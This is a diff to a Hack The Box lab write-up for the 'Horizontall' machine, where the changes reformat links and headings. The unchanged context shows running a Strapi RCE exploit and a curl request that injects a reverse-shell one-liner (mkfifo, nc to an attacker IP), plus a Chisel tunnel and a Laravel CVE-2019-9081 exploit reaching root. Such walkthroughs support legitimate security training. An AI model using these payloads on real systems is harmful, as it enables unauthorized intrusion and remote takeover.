@@ -8,9 +8,11 @@ permalink: /htb/horizontall
 ---
 
 # Horizontall Lab Report
-Add 10.10.11.10 to /etc/hosts as horizontall.htb
-Ubuntu
-Nginx 1.14
+![Screenshot 1](/assets/images/htb/horizontall/banner.png)
+- OS: Ubuntu
+- Server: Nginx 1.14
+# 0. Preparation
+1. Add 10.10.11.10 to /etc/hosts as horizontall.htb
 # 1. Enumeration
 ## 1.1 NMAP
 ```
@@ -197,7 +199,7 @@ X-Powered-By: Strapi <strapi.io>
 ```
 
 # 2. Foothold (Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated))
-https://www.exploit-db.com/exploits/50239
+<a href="https://www.exploit-db.com/exploits/50239" target="_blank" rel="noopener noreferer">https://www.exploit-db.com/exploits/50239</a>
 
 ```
 $ python3 exploit.py http://api-prod.horizontall.htb
@@ -214,7 +216,8 @@ $ python3 exploit.py http://api-prod.horizontall.htb
 
 # 3. User
 Use the JSON Web Token above to get a reverse shell (strapi)
-https://bittherapy.net/post/strapi-framework-remote-code-execution/
+<a href="https://bittherapy.net/post/strapi-framework-remote-code-execution/" target="_blank" rel="noopener noreferer">https://bittherapy.net/post/strapi-framework-remote-code-execution/</a>
+
 
 ```
 curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNzQwMDQ3LCJleHAiOjE2MzMzMzIwNDd9.H6NyjtfJoFtJqLMfZ3DBrgvAYeoVbBxYyXXtN3o6c8A' -H $'Content-Type: application/json' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.97 1337 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb:80/admin/plugins/install'
@@ -314,7 +317,7 @@ tcp6       0      0 :::80                   :::*                    LISTEN
 -> port 1337: node, port 8000?
 
 ## 4.2 Chisel
-https://www.youtube.com/watch?v=gr8ZKQpYiug
+Reference: <a href="https://www.youtube.com/watch?v=gr8ZKQpYiug" target="_blank" rel="noopener noreferer">https://www.youtube.com/watch?v=gr8ZKQpYiug</a>
 Target
 ```
 chisel client 10.10.14.97:8000 R:8001:127.0.0.1:8000
@@ -327,7 +330,8 @@ Access 127.0.0.1:8001
 -> Laravel v8 (PHP v7.4.18) 
 
 ## 4.3 Exploit (CVE-2019-9081)
-https://github.com/nth347/CVE-2019-9081_poc
+Reference: <a href="https://github.com/nth347/CVE-2019-9081_poc" target="_blank" rel="noopener noreferer">https://github.com/nth347/CVE-2019-9081_poc</a>
+
 ```
 python3 exploit.py http://localhost:8001 Monolog/RCE1 id 
 [i] Trying to clear logs
@@ -341,3 +345,4 @@ uid=0(root) gid=0(root) groups=0(root)
 [i] Trying to clear logs
 [+] Logs cleared
 ```
+Done!
